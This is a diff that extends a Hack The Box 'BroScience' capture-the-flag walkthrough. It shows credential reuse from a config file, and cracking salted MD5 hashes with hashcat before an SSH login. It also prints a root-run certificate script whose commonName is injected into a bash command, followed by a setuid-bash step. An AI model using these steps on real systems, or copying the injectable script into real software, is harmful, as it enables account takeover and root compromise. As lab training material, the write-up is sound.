@@ -146,17 +146,125 @@ Next, create a new server which is going to listen to the port set in AvatarInte
 
 ![rev-shell](/images/htb_broscience/img8.png)
 
-Great! Now, do your remind that we found a *db_connect.php* file inside /includes? Very good, in there we can find the credentials for a postgre database, let's use them:
+---
+
+## Privilege escalation www-data &rarr; bill
+
+Great! Now, do you remind that we found a *db_connect.php* file inside */includes*? Very good, in there we can find the credentials for a postgre database, let's use them to connect to the db:
 
 ```
-psql -h localhost -U <user> -p <port> -d <DB>
+psql -h localhost -U <user> -p <port> -d <db>
 ```
 
-Once connected, we list the tables and find the *users* table. Querying it we retrieve all the registered users with relative hash passwords. 
+Once connected, we list the tables and find the *users* table. Querying it, we retrieve all the registered users with relative hash passwords. 
 
 ![db](/images/htb_broscience/img7.png)
 
+These hashes are MD5 (check *register.php*), salted with a string (check *db_connect.php*). In order to crack administrator' and bill's passwords, just create a file named hashes.txt, where each line contains:
+* the hash of the user
+* :
+* \<salt\>
 
+ that is: \<hash\>:\<salt\>
+ 
+ Then, run hashcat with mode 20:
+ 
+```
+hashcat -m 20 hashes.txt <wordlist> # e.g., rockyou.txt
+```
 
+After a while, only three hashes will be cracked, but only bill is present in the home directory (see /etc/passwd file).
 
+So, connect to the ssh port using bill as username and the just-found password
 
+```
+ssh bill@broscience.htb
+```
+
+and cat the flag. 
+
+![user-flag](/images/htb_broscience/img10.png)
+
+## Privilege escalation (bill &rarr; root)
+
+Investigatin in the file system, we find a vulnerable file: /opt/renew_cert.sh
+
+```
+#!/bin/bash
+
+if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
+    echo "Usage: $0 certificate.crt";
+    exit 0;
+fi
+
+if [ -f $1 ]; then
+
+    openssl x509 -in $1 -noout -checkend 86400 > /dev/null
+
+    if [ $? -eq 0 ]; then
+        echo "No need to renew yet.";
+        exit 1;
+    fi
+
+    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)
+
+    country=$(echo $subject | grep -Eo 'C = .{2}')
+    state=$(echo $subject | grep -Eo 'ST = .*,')
+    locality=$(echo $subject | grep -Eo 'L = .*,')
+    organization=$(echo $subject | grep -Eo 'O = .*,')
+    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
+    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
+    emailAddress=$(openssl x509 -in $1 -noout -email)
+
+    country=${country:4}
+    state=$(echo ${state:5} | awk -F, '{print $1}')
+    locality=$(echo ${locality:3} | awk -F, '{print $1}')
+    organization=$(echo ${organization:4} | awk -F, '{print $1}')
+    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
+    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')
+
+    echo $subject;
+    echo "";
+    echo "Country     => $country";
+    echo "State       => $state";
+    echo "Locality    => $locality";
+    echo "Org Name    => $organization";
+    echo "Org Unit    => $organizationUnit";
+    echo "Common Name => $commonName";
+    echo "Email       => $emailAddress";
+
+    echo -e "\nGenerating certificate...";
+    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
+    $state
+    $locality
+    $organization
+    $organizationUnit
+    $commonName
+    $emailAddress
+    " 2>/dev/null
+
+    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
+else
+    echo "File doesn't exist"
+    exit 1;
+
+```
+
+* **TODO**: add explanation what bash script does
+
+* inside ~/Certs gen new cert
+
+```
+openssl req -x509 -sha256 -nodes -newkey rsa:4096 -days 5 -keyout broscience.key -out broscience.crt
+```
+* wait that the script runs and /bin/bash will set the setuid flag
+
+* run
+
+```
+/bin/bash -p
+```
+
+and get the final flag ;)
+
+![root-flag](/images/htb_broscience/img11.png)
